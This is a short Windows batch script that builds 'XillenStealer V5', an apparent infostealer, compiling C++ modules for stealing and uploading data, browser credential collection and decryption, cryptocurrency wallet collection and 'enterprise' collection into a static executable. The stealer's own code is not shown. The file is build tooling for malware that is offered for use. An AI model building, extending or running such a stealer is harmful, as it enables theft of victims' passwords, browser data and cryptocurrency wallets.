@echo off
chcp 65001 >nul
title BUILDING COMPLETE XillenStealer V5

echo.
echo ════════════════════════════════════════════════════════
echo   BUILDING XILLENSTEALER V5 - COMPLETE VERSION
echo ════════════════════════════════════════════════════════
echo.

cd /d "%~dp0"

echo [*] Cleaning...
if exist xillen_v5.exe del xillen_v5.exe
if exist build.log del build.log

echo [*] Building with ALL modules...
echo.

C:\msys64\mingw64\bin\g++.exe -o xillen_v5.exe ^
  src/core/main.cpp ^
  src/core/stealer.cpp ^
  src/core/uploader.cpp ^
  src/collectors/browser_collector.cpp ^
  src/collectors/browser_decryptor.cpp ^
  src/collectors/wallet_collector.cpp ^
  src/collectors/enterprise_collector.cpp ^
  src/crypto/aes.cpp ^
  src/crypto/hash.cpp ^
  -lgdiplus -lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi -lbcrypt ^
  -O3 -static -std=c++17 2>build.log

if %ERRORLEVEL% EQU 0 (
    echo.
    echo ════════════════════════════════════════════════════════
    echo [+] BUILD SUCCESS!
    echo ════════════════════════════════════════════════════════
    echo.
    dir xillen_v5.exe
    echo.
    echo [*] To run: .\xillen_v5.exe
    echo.
) else (
    echo.
    echo [!] BUILD FAILED - Checking errors...
    type build.log
)

pause
